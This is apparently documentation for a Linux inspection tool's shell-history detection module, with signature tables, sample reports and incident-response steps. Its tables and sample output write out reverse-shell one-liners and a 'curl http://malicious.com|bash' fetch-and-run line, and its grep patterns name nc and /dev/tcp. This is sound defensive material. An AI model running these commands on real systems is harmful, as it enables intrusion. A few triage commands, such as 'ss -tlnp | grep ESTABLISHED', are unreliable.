# 11 - 历史命令检测

**Shell 历史记录分析模块**

---

## 功能说明

历史命令模块分析 Shell 历史记录，发现：
- 反弹 shell 命令
- 境外 IP 访问
- 可疑文件下载
- 异常命令执行
- 入侵痕迹

---

## 检测内容

### 反弹 Shell 检测

| 特征 | 示例 | 风险 |
|---|---|---|
| bash 反向 shell | `bash -i >& /dev/tcp/IP/PORT 0>&1` | 高 |
| python 反向 shell | `python -c 'import socket...'` | 高 |
| perl 反向 shell | `perl -e 'use Socket...'` | 高 |
| PHP 反向 shell | `php -r '$sock=fsockopen(...)'` | 高 |
| nc 反向 shell | `nc -e /bin/bash IP PORT` | 高 |
| 命名管道 | `/dev/tcp` 文件 | 高 |

### 境外 IP 访问

| 检测规则 | 说明 |
|---|---|
| 境外 IP 连接 | 非中国 IP 的网络连接 |
| 可疑境外域名 | 访问境外可疑域名 |

### 可疑下载

| 特征 | 示例 | 风险 |
|---|---|---|
| wget/curl 境外 | 从境外下载文件 | 中 |
| 直接执行下载 | `curl ... | bash` | 高 |
| 可疑脚本下载 | 下载 .sh, .py 等 | 中 |

### 异常命令

| 特征 | 说明 | 风险 |
|---|---|---|
| 提权尝试 | `sudo su`, `su -` 等 | 中 |
| 文件篡改 | `chmod 777`, `chattr -i` 等 | 中 |
| 扫描行为 | `nmap`, `masscan` 等 | 中 |
| 密码抓取 | 相关工具执行 | 高 |
| 隧道转发 | `ssh -L`, `ngrok` 等 | 中 |

---

## 检测路径

| Shell | 历史文件 | 说明 |
|---|---|---|
| bash | `~/.bash_history` | 默认 bash 历史 |
| zsh | `~/.zsh_history` | Zsh 历史 |
| sh | `~/.history` | sh 历史 |
| root | `/root/.bash_history` | root 用户历史 |
| 其他用户 | `/home/*/.bash_history` | 其他用户历史 |

---

## 输出示例

### HTML 报告

```
┌─────────────────────────────────────────┐
│  📜 历史命令                              │
├─────────────────────────────────────────┤
│  分析用户: root, www-data, app           │
│  总命令数: 1,234 条                       │
│                                         │
│  ⚠️ 发现可疑命令:                         │
│                                         │
│  └─ 用户: root                           │
│     └─ 2026-06-10 14:23                  │
│        curl http://malicious.com|bash    │
│        (可疑: 从境外下载并直接执行)        │
│                                         │
│  境外 IP 访问:                           │
│  └─ 192.168.1.100 -> 45.33.xx.xx:80     │
│     (可疑: 连接境外服务器)                │
└─────────────────────────────────────────┘
```

### JSON 输出

```json
{
  "history": {
    "users_analyzed": ["root", "www-data", "app"],
    "total_commands": 1234,
    "reverse_shells": [
      {
        "user": "root",
        "time": "2026-06-10 14:23:00",
        "command": "curl http://malicious.com|bash",
        "risk": "high"
      }
    ],
    "foreign_connections": [
      {
        "user": "www-data",
        "time": "2026-06-10 15:00:00",
        "ip": "45.33.xx.xx",
        "port": 80,
        "risk": "medium"
      }
    ],
    "suspicious_downloads": [],
    "issues": [
      {
        "level": "warning",
        "module": "history",
        "desc": "发现疑似反弹 shell 命令"
      }
    ]
  }
}
```

---

## 告警规则

| 规则 | 条件 | 级别 | 说明 |
|---|---|---|---|
| 反弹 shell | 发现反弹 shell 命令 | 严重 | 主机已被控 |
| 境外连接 | 连接境外 IP | 警告 | 需确认合法性 |
| 可疑下载 | 从境外下载并执行 | 严重 | 可能下载后门 |
| 提权尝试 | 发现 su/sudo 异常 | 警告 | 可能正在提权 |

---

## 使用场景

### 日常巡检

```bash
./inspect.sh -m routine
# 自动包含历史命令分析
```

### 手动分析历史

```bash
# 查看 root 历史
history

# 查看最近命令
tail -100 /root/.bash_history

# 查找可疑命令
grep -E "wget|curl.*\|bash|bash.*\|nc |/dev/tcp|python.*-c" /root/.bash_history

# 查找境外 IP
grep -E "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" /root/.bash_history | grep -v "10\.\|192\.168\.\|172\."

# 查找下载命令
grep -E "wget|curl" /root/.bash_history
```

### 导出历史用于分析

```bash
# 导出所有用户历史
for u in $(cut -d: -f1 /etc/passwd); do
  hist="/home/$u/.bash_history"
  [ -f "$hist" ] && echo "=== $u ===" >> /tmp/all_history.txt && cat "$hist" >> /tmp/all_history.txt
done

# 分析
grep -E "wget|curl|bash|/dev/tcp" /tmp/all_history.txt
```

---

## 故障排查

**Q: 发现反弹 shell 命令**

```bash
# 1. 立即断开网络连接
# 或者找到攻击者 IP 并封禁
iptables -A INPUT -s ATTACKER_IP -j DROP

# 2. 查看是否还有 active 连接
ss -tlnp | grep ESTABLISHED

# 3. 杀死可疑进程
ps aux | grep -E "bash -i|nc |python.*socket"

# 4. 检查是否有新的后门
./inspect.sh -m emergency

# 5. 建议立即重装系统或恢复备份
```

**Q: 发现境外连接**

```bash
# 1. 查看连接详情
ss -tlnp | grep FOREIGN

# 2. 分析访问了什么
# 检查对应的日志

# 3. 如果确认是攻击
# - 封禁 IP
# - 更改所有密码
# - 检查是否有数据外传

# 4. 如果是正常业务
# - 记录在案
# - 确认访问内容
```

---

*最后更新: 2026-06-11*